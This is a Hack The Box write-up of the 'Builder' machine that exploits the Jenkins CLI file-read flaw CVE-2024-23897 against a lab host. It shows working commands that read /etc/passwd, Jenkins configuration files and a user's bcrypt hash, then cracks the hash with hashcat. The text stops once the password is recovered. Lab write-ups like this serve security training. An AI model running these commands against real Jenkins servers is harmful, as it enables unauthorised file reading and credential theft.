---
title: Builder
date: 2024-01-31
author: Flavien
draft: false
tags:
  - CTF
  - HTB
  - Machine
  - Box
categories:
  - Writeup
  - Box
  - Machine
description: HTB writeup for the hard machine "Builder"
summary: A complete writeup of the Hack The Box machine "Builder". Covering from initial enumeration to root flag.
---
## Enumeration

```bash
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM
8080/tcp open  http    syn-ack ttl 62 Jetty 10.0.18
|_http-favicon: Unknown favicon MD5: 23E8C7BD78E8CD826C5A6073B15068B1
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
|_http-server-header: Jetty(10.0.18)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

From the nmap scan, we notice 2 ports open: ssh and http -> we can head over to the website ==> We see it is a `Jenkins`instance

Looking at the website, we can see the version is `2.441`and we can search for exploits regarding this version:

![](Jenkins_dashboard.png)

We find [CVE-2024-23897](https://github.com/h4x0r-dz/CVE-2024-23897?tab=readme-ov-file) when looking for exploits and we can give it a shot.

```bash
python3 exploit.py -u http://10.129.230.220:8080 -f /etc/passwd
RESPONSE from 10.129.230.220:8080: b'\x00\x00\x00\x00\x01\x08\n\x00\x00\x00K\x08ERROR: Too many arguments: daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n\x00\x00\x00\x1e\x08java -jar jenkins-cli.jar help\x00\x00\x00\n\x08 [COMMAND]\x00\x00\x00\x01\x08\n\x00\x00\x00N\x08Lists all the available commands or a detailed description of single command.\n\x00\x00\x00J\x08 COMMAND : Name of the command (default: root:x:0:0:root:/root:/bin/bash)\n\x00\x00\x00\x04\x04\x00\x00\x00\x02'
```

we see that it seems vulnerable, now we need to find a way to make this work!
## Exploitation
Looking at the [Official Jenkins documentation](), we see this:

```
## Descriptions[](https://www.jenkins.io/security/advisory/2024-01-24/#descriptions)

### Arbitrary file read vulnerability through the CLI can lead to RCE[](https://www.jenkins.io/security/advisory/2024-01-24/#SECURITY-3314)

**SECURITY-3314 / CVE-2024-23897**  
**Severity (CVSS):** [Critical](https://www.first.org/cvss/calculator/3.1#CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H)  
**Description:**

Jenkins has a built-in [command line interface (CLI)](https://www.jenkins.io/doc/book/managing/cli/) to access Jenkins from a script or shell environment.

Jenkins uses the [args4j library](https://github.com/kohsuke/args4j) to parse command arguments and options on the Jenkins controller when processing CLI commands. This command parser has a feature that replaces an `@` character followed by a file path in an argument with the file’s contents (`expandAtFiles`). This feature is enabled by default and Jenkins 2.441 and earlier, LTS 2.426.2 and earlier does not disable it.

This allows attackers to read arbitrary files on the Jenkins controller file system using the default character encoding of the Jenkins controller process.

- Attackers with Overall/Read permission can read entire files.
- Attackers **without** Overall/Read permission can read the first few lines of files. The number of lines that can be read depends on available CLI commands. As of publication of this advisory, the Jenkins security team has found ways to read the first three lines of files in recent releases of Jenkins without having any plugins installed, and has not identified any plugins that would increase this line count.

Binary files containing cryptographic keys used for various Jenkins features can also be read, with some limitations (see [note on binary files below](https://www.jenkins.io/security/advisory/2024-01-24/#binary-files-note)). As of publication, the Jenkins security team has confirmed the following possible attacks in addition to reading contents of all files with a known file path. All of them leverage attackers' ability to obtain cryptographic keys from binary files, and are therefore only applicable to instances where that is feasible.
```

We can then look for information about the current running process by checking the file `/proc/self/environ`using:

```bash
python3 poc.py http://10.129.230.220:8080 /proc/self/environ  
REQ: b'\x00\x00\x00\x06\x00\x00\x04help\x00\x00\x00\x15\x00\x00\x13@/proc/self/environ\x00\x00\x00\x05\x02\x00\x03GBK\x00\x00\x00\x07\x01\x00\x05zh_CN\x00\x00\x00\x00\x03'

RESPONSE: b'\x00\x00\x00\x00\x12\x08  add-job-to-view\n\x00\x00\x00\x17\x08    Adds jobs to view.\n\x00\x00\x00\x08\x08  build\n\x00\x00\x00=\x08    Builds a job, and optionally waits until its completion.\n\x00\x00\x00\x14\x08  cancel-quiet-down\n\x00\x00\x003\x08    Cancel the effect of the "quiet-down" command.\n\x00\x00\x00\x0e\x08  clear-queue\n\x00\x00\x00\x1c\x08    Clears the build queue.\n\x00\x00\x00\x0f\x08  connect-node\n\x00\x00\x00\x1b\x08    Reconnect to a node(s)\n\x00\x00\x00\n\x08  console\n\x00\x00\x00)\x08    Retrieves console output of a build.\n\x00\x00\x00\x0b\x08  copy-job\n\x00\x00\x00\x12\x08    Copies a job.\n\x00\x00\x00\x1c\x08  create-credentials-by-xml\n\x00\x00\x00\x1d\x08    Create Credential by XML\n\x00\x00\x00#\x08  create-credentials-domain-by-xml\n\x00\x00\x00%\x08    Create Credentials Domain by XML\n\x00\x00\x00\r\x08  create-job\n\x00\x00\x00D\x08    Creates a new job by reading stdin as a configuration XML file.\n\x00\x00\x00\x0e\x08  create-node\n\x00\x00\x00@\x08    Creates a new node by reading stdin as a XML configuration.\n\x00\x00\x00\x0e\x08  create-view\n\x00\x00\x00@\x08    Creates a new view by reading stdin as a XML configuration.\n\x00\x00\x00\x15\x08  declarative-linter\n\x00\x00\x00=\x08    Validate a Jenkinsfile containing a Declarative Pipeline\n\x00\x00\x00\x10\x08  delete-builds\n\x00\x00\x00\x1d\x08    Deletes build record(s).\n\x00\x00\x00\x15\x08  delete-credentials\n\x00\x00\x00\x18\x08    Delete a Credential\n\x00\x00\x00\x1c\x08  delete-credentials-domain\n\x00\x00\x00 \x08    Delete a Credentials Domain\n\x00\x00\x00\r\x08  delete-job\n\x00\x00\x00\x14\x08    Deletes job(s).\n\x00\x00\x00\x0e\x08  delete-node\n\x00\x00\x00\x14\x08    Deletes node(s)\n\x00\x00\x00\x0e\x08  delete-view\n\x00\x00\x00\x15\x08    Deletes view(s).\n\x00\x00\x00\x0e\x08  disable-job\n\x00\x00\x00\x14\x08    Disables a job.\n\x00\x00\x00\x11\x08  disable-plugin\n\x00\x00\x00+\x08    Disable one or more installed plugins.\n\x00\x00\x00\x12\x08  disconnect-node\n\x00\x00\x00\x1d\x08    Disconnects from a node.\n\x00\x00\x00\r\x08  enable-job\n\x00\x00\x00\x13\x08    Enables a job.\n\x00\x00\x00\x10\x08  enable-plugin\n\x00\x00\x008\x08    Enables one or more installed plugins transitively.\n\x00\x00\x00\x19\x08  get-credentials-as-xml\n\x00\x00\x000\x08    Get a Credentials as XML (secrets redacted)\n\x00\x00\x00 \x08  get-credentials-domain-as-xml\n\x00\x00\x00$\x08    Get a Credentials Domain as XML\n\x00\x00\x00\n\x08  get-job\n\x00\x00\x00,\x08    Dumps the job definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-node\n\x00\x00\x00-\x08    Dumps the node definition XML to stdout.\n\x00\x00\x00\x0b\x08  get-view\n\x00\x00\x00-\x08    Dumps the view definition XML to stdout.\n\x00\x00\x00\t\x08  groovy\n\x00\x00\x00+\x08    Executes the specified Groovy script. \n\x00\x00\x00\x0b\x08  groovysh\n\x00\x00\x00&\x08    Runs an interactive groovy shell.\n\x00\x00\x00\x07\x08  help\n\x00\x00\x00R\x08    Lists all the available commands or a detailed description of single command.\n\x00\x00\x00\x1c\x08  import-credentials-as-xml\n\x00\x00\x00\xbe\x08    Import credentials as XML. The output of "list-credentials-as-xml" can be used as input here as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00\x11\x08  install-plugin\n\x00\x00\x00J\x08    Installs a plugin either from a file, an URL, or from update center. \n\x00\x00\x00\r\x08  keep-build\n\x00\x00\x00.\x08    Mark the build to keep the build forever.\n\x00\x00\x00\x0f\x08  list-changes\n\x00\x00\x004\x08    Dumps the changelog for the specified build(s).\n\x00\x00\x00\x13\x08  list-credentials\n\x00\x00\x00.\x08    Lists the Credentials in a specific Store\n\x00\x00\x00\x1a\x08  list-credentials-as-xml\n\x00\x00\x00\xcc\x08    Export credentials as XML. The output of this command can be used as input for "import-credentials-as-xml" as is, the only needed change is to set the actual Secrets which are redacted in the output.\n\x00\x00\x00%\x08  list-credentials-context-resolvers\n\x00\x00\x00\'\x08    List Credentials Context Resolvers\n\x00\x00\x00\x1d\x08  list-credentials-providers\n\x00\x00\x00\x1f\x08    List Credentials Providers\n\x00\x00\x00\x0c\x08  list-jobs\n\x00\x00\x005\x08    Lists all jobs in a specific view or item group.\n\x00\x00\x00\x0f\x08  list-plugins\n\x00\x00\x00)\x08    Outputs a list of installed plugins.\n\x00\x00\x00\x07\x08  mail\n\x00\x00\x001\x08    Reads stdin and sends that out as an e-mail.\n\x00\x00\x00\x0f\x08  offline-node\n\x00\x00\x00_\x08    Stop using a node for performing builds temporarily, until the next "online-node" command.\n\x00\x00\x00\x0e\x08  online-node\n\x00\x00\x00a\x08    Resume using a node for performing builds, to cancel out the earlier "offline-node" command.\n\x00\x00\x00\r\x08  quiet-down\n\x00\x00\x00O\x08    Quiet down Jenkins, in preparation for a restart. Don\xa1\xaft start any builds.\n\x00\x00\x00\x17\x08  reload-configuration\n\x00\x00\x00\x8a\x08    Discard all the loaded data in memory and reload everything from file system. Useful when you modified config files directly on disk.\n\x00\x00\x00\r\x08  reload-job\n\x00\x00\x00\x12\x08    Reload job(s)\n\x00\x00\x00\x17\x08  remove-job-from-view\n\x00\x00\x00\x1c\x08    Removes jobs from view.\n\x00\x00\x00\x12\x08  replay-pipeline\n\x00\x00\x00I\x08    Replay a Pipeline build with edited script taken from standard input\n\x00\x00\x00\n\x08  restart\n\x00\x00\x00\x15\x08    Restart Jenkins.\n\x00\x00\x00\x15\x08  restart-from-stage\n\x00\x00\x00G\x08    Restart a completed Declarative Pipeline build from a given stage.\n\x00\x00\x00\x0f\x08  safe-restart\n\x00\x00\x003\x08    Safe Restart Jenkins. Don\xa1\xaft start any builds.\n\x00\x00\x00\x10\x08  safe-shutdown\n\x00\x00\x00l\x08    Puts Jenkins into the quiet mode, wait for existing builds to be completed, and then shut down Jenkins.\n\x00\x00\x00\r\x08  session-id\n\x00\x00\x00G\x08    Outputs the session ID, which changes every time Jenkins restarts.\n\x00\x00\x00\x18\x08  set-build-description\n\x00\x00\x00%\x08    Sets the description of a build.\n\x00\x00\x00\x19\x08  set-build-display-name\n\x00\x00\x00%\x08    Sets the displayName of a build.\n\x00\x00\x00\x0b\x08  shutdown\n\x00\x00\x00+\x08    Immediately shuts down Jenkins server.\n\x00\x00\x00\x0e\x08  stop-builds\n\x00\x00\x00\'\x08    Stop all running builds for job(s)\n\x00\x00\x00\x1c\x08  update-credentials-by-xml\n\x00\x00\x00\x1e\x08    Update Credentials by XML\n\x00\x00\x00#\x08  update-credentials-domain-by-xml\n\x00\x00\x00%\x08    Update Credentials Domain by XML\n\x00\x00\x00\r\x08  update-job\n\x00\x00\x00T\x08    Updates the job definition XML from stdin. The opposite of the get-job command.\n\x00\x00\x00\x0e\x08  update-node\n\x00\x00\x00V\x08    Updates the node definition XML from stdin. The opposite of the get-node command.\n\x00\x00\x00\x0e\x08  update-view\n\x00\x00\x00V\x08    Updates the view definition XML from stdin. The opposite of the get-view command.\n\x00\x00\x00\n\x08  version\n\x00\x00\x00!\x08    Outputs the current version.\n\x00\x00\x00\x14\x08  wait-node-offline\n\x00\x00\x00\'\x08    Wait for a node to become offline.\n\x00\x00\x00\x13\x08  wait-node-online\n\x00\x00\x00&\x08    Wait for a node to become online.\n\x00\x00\x00\x0b\x08  who-am-i\n\x00\x00\x00-\x08    Reports your credential and permissions.\n\x00\x00\x00\x01\x08\n\x00\x00\x02U\x08ERROR: No such command HOSTNAME=0f52c222a4cc\x00JENKINS_UC_EXPERIMENTAL=https://updates.jenkins.io/experimental\x00JAVA_HOME=/opt/java/openjdk\x00JENKINS_INCREMENTALS_REPO_MIRROR=https://repo.jenkins-ci.org/incrementals\x00COPY_REFERENCE_FILE_LOG=/var/jenkins_home/copy_reference_file.log\x00PWD=/\x00JENKINS_SLAVE_AGENT_PORT=50000\x00JENKINS_VERSION=2.441\x00HOME=/var/jenkins_home\x00LANG=C.UTF-8\x00JENKINS_UC=https://updates.jenkins.io\x00SHLVL=0\x00JENKINS_HOME=/var/jenkins_home\x00REF=/usr/share/jenkins/ref\x00PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\x00. Available commands are above. \n\x00\x00\x00\x04\x04\x00\x00\x00\x05'
```

However this does not work well -> after some more research, we discover that we can simply use the `jenkins-cli.jar`file from the instance server to make this work

==> We can use it to read any files with:

```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/etc/passwd"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin: No such agent "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin" exists.
root:x:0:0:root:/root:/bin/bash: No such agent "root:x:0:0:root:/root:/bin/bash" exists.
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin: No such agent "mail:x:8:8:mail:/var/mail:/usr/sbin/nologin" exists.
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin: No such agent "backup:x:34:34:backup:/var/backups:/usr/sbin/nologin" exists.
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin: No such agent "_apt:x:42:65534::/nonexistent:/usr/sbin/nologin" exists.
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin: No such agent "nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin" exists.
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin: No such agent "lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin" exists.
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin: No such agent "uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin" exists.
bin:x:2:2:bin:/bin:/usr/sbin/nologin: No such agent "bin:x:2:2:bin:/bin:/usr/sbin/nologin" exists.
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin: No such agent "news:x:9:9:news:/var/spool/news:/usr/sbin/nologin" exists.
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin: No such agent "proxy:x:13:13:proxy:/bin:/usr/sbin/nologin" exists.
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin: No such agent "irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin" exists.
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin: No such agent "list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin" exists.
jenkins:x:1000:1000::/var/jenkins_home:/bin/bash: No such agent "jenkins:x:1000:1000::/var/jenkins_home:/bin/bash" exists.
games:x:5:60:games:/usr/games:/usr/sbin/nologin: No such agent "games:x:5:60:games:/usr/games:/usr/sbin/nologin" exists.
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin: No such agent "man:x:6:12:man:/var/cache/man:/usr/sbin/nologin" exists.
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin: No such agent "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin" exists.
sys:x:3:3:sys:/dev:/usr/sbin/nologin: No such agent "sys:x:3:3:sys:/dev:/usr/sbin/nologin" exists.
sync:x:4:65534:sync:/bin:/bin/sync: No such agent "sync:x:4:65534:sync:/bin:/bin/sync" exists.
```

and we discover a user `jenkins`with home directory `jenkins_home` --> we can then read the user flag with:

```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/user.txt" 
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true

ERROR: No such agent "c1fafac37bc2bd13a195850d3f470001" exists.
```

## Privilege escalation
After some research about `jenkins`file structure, we discover this:

```
JENKINS_HOME
 +- config.xml     (jenkins root configuration)
 +- *.xml          (other site-wide configuration files)
 +- userContent    (files in this directory will be served under your http://server/userContent/)
 +- fingerprints   (stores fingerprint records)
 +- nodes          (slave configurations)
 +- plugins        (stores plugins)
 +- secrets        (secretes needed when migrating credentials to other servers)
 +- workspace (working directory for the version control system)
     +- [JOBNAME] (sub directory for each job)
 +- jobs
     +- [JOBNAME]      (sub directory for each job)
         +- config.xml     (job configuration file)
         +- latest         (symbolic link to the last successful build)
         +- builds
             +- [BUILD_ID]     (for each build)
                 +- build.xml      (build result summary)
                 +- log            (log file)
                 +- changelog.xml  (change log)
```

We can then try to look for the `config.xml`file using:

```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/config.xml"                  
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
  <primaryView>all</primaryView>: No such agent "  <primaryView>all</primaryView>" exists.
  <label></label>: No such agent "  <label></label>" exists.
  <clouds/>: No such agent "  <clouds/>" exists.
  <disabledAdministrativeMonitors/>: No such agent "  <disabledAdministrativeMonitors/>" exists.
  </authorizationStrategy>: No such agent "  </authorizationStrategy>" exists.
<hudson>: No such agent "<hudson>" exists.
    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>: No such agent "    <excludeClientIPFromCrumb>false</excludeClientIPFromCrumb>" exists.
    </hudson.model.AllView>: No such agent "    </hudson.model.AllView>" exists.
  </crumbIssuer>: No such agent "  </crumbIssuer>" exists.
  <disableRememberMe>false</disableRememberMe>: No such agent "  <disableRememberMe>false</disableRememberMe>" exists.
  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">: No such agent "  <authorizationStrategy class="hudson.security.FullControlOnceLoggedInAuthorizationStrategy">" exists.
  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>: No such agent "  <viewsTabBar class="hudson.views.DefaultViewsTabBar"/>" exists.
</hudson>: No such agent "</hudson>" exists.
  <numExecutors>2</numExecutors>: No such agent "  <numExecutors>2</numExecutors>" exists.
    <disableSignup>true</disableSignup>: No such agent "    <disableSignup>true</disableSignup>" exists.
      <properties class="hudson.model.View$PropertyList"/>: No such agent "      <properties class="hudson.model.View$PropertyList"/>" exists.
  </views>: No such agent "  </views>" exists.
  <globalNodeProperties/>: No such agent "  <globalNodeProperties/>" exists.
    <enableCaptcha>false</enableCaptcha>: No such agent "    <enableCaptcha>false</enableCaptcha>" exists.
  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>: No such agent "  <workspaceDir>${JENKINS_HOME}/workspace/${ITEM_FULL_NAME}</workspaceDir>" exists.
    <denyAnonymousReadAccess>false</denyAnonymousReadAccess>: No such agent "    <denyAnonymousReadAccess>false</denyAnonymousReadAccess>" exists.
  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>: No such agent "  <scmCheckoutRetryCount>0</scmCheckoutRetryCount>" exists.
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
  </securityRealm>: No such agent "  </securityRealm>" exists.
  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>: No such agent "  <projectNamingStrategy class="jenkins.model.ProjectNamingStrategy$DefaultProjectNamingStrategy"/>" exists.
  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">: No such agent "  <crumbIssuer class="hudson.security.csrf.DefaultCrumbIssuer">" exists.
      <name>all</name>: No such agent "      <name>all</name>" exists.
  <nodeProperties/>: No such agent "  <nodeProperties/>" exists.
  <views>: No such agent "  <views>" exists.
  <slaveAgentPort>50000</slaveAgentPort>: No such agent "  <slaveAgentPort>50000</slaveAgentPort>" exists.
  <useSecurity>true</useSecurity>: No such agent "  <useSecurity>true</useSecurity>" exists.
  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>: No such agent "  <buildsDir>${ITEM_ROOTDIR}/builds</buildsDir>" exists.
  <jdks/>: No such agent "  <jdks/>" exists.
  <version>2.441</version>: No such agent "  <version>2.441</version>" exists.
      <owner class="hudson" reference="../../.."/>: No such agent "      <owner class="hudson" reference="../../.."/>" exists.
  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>: No such agent "  <nodeRenameMigrationNeeded>false</nodeRenameMigrationNeeded>" exists.
      <filterExecutors>false</filterExecutors>: No such agent "      <filterExecutors>false</filterExecutors>" exists.
      <filterQueue>false</filterQueue>: No such agent "      <filterQueue>false</filterQueue>" exists.
  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">: No such agent "  <securityRealm class="hudson.security.HudsonPrivateSecurityRealm">" exists.
  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>: No such agent "  <myViewsTabBar class="hudson.views.DefaultMyViewsTabBar"/>" exists.
    <hudson.model.AllView>: No such agent "    <hudson.model.AllView>" exists.
  <mode>NORMAL</mode>: No such agent "  <mode>NORMAL</mode>" exists.

ERROR: Error occurred while performing this command, see previous stderr output.
```

We also discover this file `users.txt`:

```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/users/users.xml"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
      <string>jennifer_12108429903186576833</string>: No such agent "      <string>jennifer_12108429903186576833</string>" exists.
  <idToDirectoryNameMap class="concurrent-hash-map">: No such agent "  <idToDirectoryNameMap class="concurrent-hash-map">" exists.
    <entry>: No such agent "    <entry>" exists.
      <string>jennifer</string>: No such agent "      <string>jennifer</string>" exists.
  <version>1</version>: No such agent "  <version>1</version>" exists.
</hudson.model.UserIdMapper>: No such agent "</hudson.model.UserIdMapper>" exists.
  </idToDirectoryNameMap>: No such agent "  </idToDirectoryNameMap>" exists.
<hudson.model.UserIdMapper>: No such agent "<hudson.model.UserIdMapper>" exists.
    </entry>: No such agent "    </entry>" exists.
```

and here we discover the user `jennifer_121...`--> we can then try to get her config file using:

```bash
java -jar jenkins-cli.jar -s http://10.129.230.220:8080/ -http connect-node "@/var/jenkins_home/users/jennifer_12108429903186576833/config.xml"
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">: No such agent "    <hudson.tasks.Mailer_-UserProperty plugin="mailer@463.vedf8358e006b_">" exists.
    <hudson.search.UserSearchProperty>: No such agent "    <hudson.search.UserSearchProperty>" exists.
      <roles>: No such agent "      <roles>" exists.
    <jenkins.security.seed.UserSeedProperty>: No such agent "    <jenkins.security.seed.UserSeedProperty>" exists.
      </tokenStore>: No such agent "      </tokenStore>" exists.
    </hudson.search.UserSearchProperty>: No such agent "    </hudson.search.UserSearchProperty>" exists.
      <timeZoneName></timeZoneName>: No such agent "      <timeZoneName></timeZoneName>" exists.
  <properties>: No such agent "  <properties>" exists.
    <jenkins.security.LastGrantedAuthoritiesProperty>: No such agent "    <jenkins.security.LastGrantedAuthoritiesProperty>" exists.
      <flags/>: No such agent "      <flags/>" exists.
    <hudson.model.MyViewsProperty>: No such agent "    <hudson.model.MyViewsProperty>" exists.
</user>: No such agent "</user>" exists.
    </jenkins.security.ApiTokenProperty>: No such agent "    </jenkins.security.ApiTokenProperty>" exists.
      <views>: No such agent "      <views>" exists.
        <string>authenticated</string>: No such agent "        <string>authenticated</string>" exists.
    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">: No such agent "    <org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty plugin="display-url-api@2.200.vb_9327d658781">" exists.
<user>: No such agent "<user>" exists.
          <name>all</name>: No such agent "          <name>all</name>" exists.
  <description></description>: No such agent "  <description></description>" exists.
      <emailAddress>jennifer@builder.htb</emailAddress>: No such agent "      <emailAddress>jennifer@builder.htb</emailAddress>" exists.
      <collapsed/>: No such agent "      <collapsed/>" exists.
    </jenkins.security.seed.UserSeedProperty>: No such agent "    </jenkins.security.seed.UserSeedProperty>" exists.
    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>: No such agent "    </org.jenkinsci.plugins.displayurlapi.user.PreferredProviderUserProperty>" exists.
    </hudson.model.MyViewsProperty>: No such agent "    </hudson.model.MyViewsProperty>" exists.
      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>: No such agent "      <domainCredentialsMap class="hudson.util.CopyOnWriteMap$Hash"/>" exists.
          <filterQueue>false</filterQueue>: No such agent "          <filterQueue>false</filterQueue>" exists.
    <jenkins.security.ApiTokenProperty>: No such agent "    <jenkins.security.ApiTokenProperty>" exists.
      <primaryViewName></primaryViewName>: No such agent "      <primaryViewName></primaryViewName>" exists.
      </views>: No such agent "      </views>" exists.
    </hudson.model.TimeZoneProperty>: No such agent "    </hudson.model.TimeZoneProperty>" exists.
    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">: No such agent "    <com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty plugin="credentials@1319.v7eb_51b_3a_c97b_">" exists.
    </hudson.model.PaneStatusProperties>: No such agent "    </hudson.model.PaneStatusProperties>" exists.
    </hudson.tasks.Mailer_-UserProperty>: No such agent "    </hudson.tasks.Mailer_-UserProperty>" exists.
        <tokenList/>: No such agent "        <tokenList/>" exists.
    <jenkins.console.ConsoleUrlProviderUserProperty/>: No such agent "    <jenkins.console.ConsoleUrlProviderUserProperty/>" exists.
        </hudson.model.AllView>: No such agent "        </hudson.model.AllView>" exists.
      <timestamp>1707318554385</timestamp>: No such agent "      <timestamp>1707318554385</timestamp>" exists.
          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>: No such agent "          <owner class="hudson.model.MyViewsProperty" reference="../../.."/>" exists.
  </properties>: No such agent "  </properties>" exists.
    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such agent "    </jenkins.model.experimentalflags.UserExperimentalFlagsProperty>" exists.
    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>: No such agent "    </com.cloudbees.plugins.credentials.UserCredentialsProvider_-UserCredentialsProperty>" exists.
    <hudson.security.HudsonPrivateSecurityRealm_-Details>: No such agent "    <hudson.security.HudsonPrivateSecurityRealm_-Details>" exists.
      <insensitiveSearch>true</insensitiveSearch>: No such agent "      <insensitiveSearch>true</insensitiveSearch>" exists.
          <properties class="hudson.model.View$PropertyList"/>: No such agent "          <properties class="hudson.model.View$PropertyList"/>" exists.
    <hudson.model.TimeZoneProperty>: No such agent "    <hudson.model.TimeZoneProperty>" exists.
        <hudson.model.AllView>: No such agent "        <hudson.model.AllView>" exists.
    </hudson.security.HudsonPrivateSecurityRealm_-Details>: No such agent "    </hudson.security.HudsonPrivateSecurityRealm_-Details>" exists.
      <providerId>default</providerId>: No such agent "      <providerId>default</providerId>" exists.
      </roles>: No such agent "      </roles>" exists.
    </jenkins.security.LastGrantedAuthoritiesProperty>: No such agent "    </jenkins.security.LastGrantedAuthoritiesProperty>" exists.
    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>: No such agent "    <jenkins.model.experimentalflags.UserExperimentalFlagsProperty>" exists.
    <hudson.model.PaneStatusProperties>: No such agent "    <hudson.model.PaneStatusProperties>" exists.
<?xml version='1.1' encoding='UTF-8'?>: No such agent "<?xml version='1.1' encoding='UTF-8'?>" exists.
  <fullName>jennifer</fullName>: No such agent "  <fullName>jennifer</fullName>" exists.
      <seed>6841d11dc1de101d</seed>: No such agent "      <seed>6841d11dc1de101d</seed>" exists.
  <id>jennifer</id>: No such agent "  <id>jennifer</id>" exists.
  <version>10</version>: No such agent "  <version>10</version>" exists.
      <tokenStore>: No such agent "      <tokenStore>" exists.
          <filterExecutors>false</filterExecutors>: No such agent "          <filterExecutors>false</filterExecutors>" exists.
    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>: No such agent "    <io.jenkins.plugins.thememanager.ThemeUserProperty plugin="theme-manager@215.vc1ff18d67920"/>" exists.
      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>: No such agent "      <passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>" exists.
```

and we capture her password hash in `bcrypt`form: **`$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a`**

==> We can crack it using hashcat

```bash
hashcat -m 3200 hash.txt /usr/share/wordlists/rockyou.txt.gz
$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a:princess
```

and we now have what seem to be valid credentials:
- **`jennifer_12108429903186576833 - princess`**

